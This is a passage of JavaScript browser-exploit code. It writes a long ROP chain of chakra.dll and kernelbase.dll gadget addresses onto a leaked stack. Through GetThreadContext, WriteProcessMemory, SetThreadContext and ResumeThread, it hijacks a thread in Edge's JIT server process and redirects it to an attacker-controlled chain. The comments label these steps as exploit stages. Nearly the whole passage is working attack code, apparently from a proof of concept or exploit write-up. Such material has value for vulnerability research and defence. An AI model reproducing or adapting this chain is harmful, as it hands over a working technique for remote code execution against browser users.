    write64(lowerStack+offset, upperStack, chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // Save VirtualAlloc_allocation+0xf8. This is the offset in our buffer (CONTEXT structure) that is RIP
    // RAX already has CONTEXT+0x30, so just need to add to reach CONTEXT+0xf8
    write64(lowerStack+offset, upperStack, chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x26f73a, chakraHigh);       // 0x18026f73a: add rax, 0x68 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a120, kernelbaseHigh); // .data section of kernelbase.dll where we will store CONTEXT.Rip
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // We need to set CONTEXT.ContextFlags. This address (0x30 offset from CONTEXT buffer allocated from VirtualAlloc) is in kernelbase+0x21a110
    // The value we need to set is 0x10001F
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll with CONTEXT.ContextFlags address
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x0010001F, 0x00000000);             // CONTEXT_ALL
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x313349, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // HANDLE hThread
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
    next();

    // LPCONTEXT lpContext
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a108-0x8, kernelbaseHigh); // .data section of kernelbase.dll where our VirtualAlloc allocation is (our CONTEXT structure)
    next();                                                                      
    write64(lowerStack+offset, upperStack, chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
    next();

    // Call KERNELBASE!GetThreadContext
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x72d10, kernelbaseHigh); // KERNELBASE!GetThreadContext address 
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!GetThreadContext)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);       // "return address" for KERNELBASE!GetThreadContext - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();

    // WriteProcessMemory() ROP chain (Number 3)
    // Stage 9 -> Write our ROP chain to the remote process, using the JIT handle and the leaked stack via GetThreadContext()

    // SIZE_T nSize (R9)
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x000000d8, 0x00000000);             // SIZE_T nSize (0xd8)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // Retrieve CONTEXT.Rsp (from VirtualAlloc allocation)
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a198, kernelbaseHigh);      // .data section of kernelbase.dll where CONTEXT.Rsp resides
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
    next();

    // LPVOID lpBaseAddress (RDX)
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a108-0x08, kernelbaseHigh);      // .data section of kernelbase.dll where CONTEXT.Rsp resides
    next();                                                                      
    write64(lowerStack+offset, upperStack, chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00000098, 0x00000000);             // Distance from VirtualAlloc allocation to CONTEXT.Rsp
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x235503, chakraHigh);      // 0x180235503: add rax, rdx ; ret (Places CONTEXT.Rsp into RAX)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x435f21, chakraHigh);      // 0x180435f21: mov rdx, rax ; mov rax, rdx ; add rsp, 0x28 ; ret (RAX and RDX now both have pointer to CONTEXT.Rsp)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x26ef31, chakraHigh);      // 0x18026ef31: mov rax, qword [rax] ; ret (get CONTEXT.Rsp)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x435f21, chakraHigh);      // 0x180435f21: mov rdx, rax ; mov rax, rdx ; add rsp, 0x28 ; ret (RAX and RDX now both have CONTEXT.Rsp)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // LPCVOID lpBuffer (R8)
    write64(lowerStack+offset, upperStack, chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x74e050, chakraHigh);      // .data section of chakra.dll where our ROP chain is
    next();

    // HANDLE hProcess (RCX)
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds the full perms handle to JIT server
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
    next();                                                                     // Recall RAX already has a writable pointer in it  
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x26ef31, chakraHigh);      // 0x18026ef31: mov rax, qword [rax] ; ret
    next();

    // Call KERNELBASE!WriteProcessMemory
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x20)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();

    // SetThreadContext() ROP chain
    // Stage 10 -> Update RSP of our new thread in the JIT process to be the address of our VirtualAllocEx allocation (where our final stage ROP chain is currently
    // Update RIP of our new thread in the JIT process to be the address of a CFG-compliant function. After much testing, Rip doesn't seem to let you set a "ret" ROP gadget
    // The shortest function I could find was GetCurrentThread, as it just returns places a "psuedo handle" of 0xFFFFFFFFFFFFFFFE into RAX, and performs the ret we need to...
    // ... return into RSP

    // Retrieve CONTEXT.Rip to update it to call GetCurrentThread
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a120, kernelbaseHigh); // .data section of kernelbase.dll where we will store CONTEXT.Rip
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x83b00, kernelbaseHigh); // GetCurrentThread (Context.Rip points to this and returns into our final ROP chain with the JIT process)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x313349, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // HANDLE hThread (RCX)
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
    next();

    // const CONTEXT *lpContext
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a108-0x8, kernelbaseHigh); // .data section of kernelbase.dll where our VirtualAlloc allocation is (our CONTEXT structure)
    next();                                                                      
    write64(lowerStack+offset, upperStack, chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
    next();

    // Call KERNELBASE!SetThreadContext
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x7aa0, kernelbaseHigh); // KERNELBASE!SetThreadContext address 
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!SetThreadContext)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);       // "return address" for KERNELBASE!SetThreadContext - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();

    // ResumeThread() ROP chain
    // Stage 11 -> Resume the thread, with RIP now pointing to a a "NOP" function which will just return into our ROP chain

    // HANDLE hThread (RCX)
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
    next();

    // Call KERNELBASE!ResumeThread
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x70a50, kernelbaseHigh); // KERNELBASE!ResumeThread address 
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!ResumeThread)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);       // "return address" for KERNELBASE!ResumeThread - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);
    next();
}

</script>
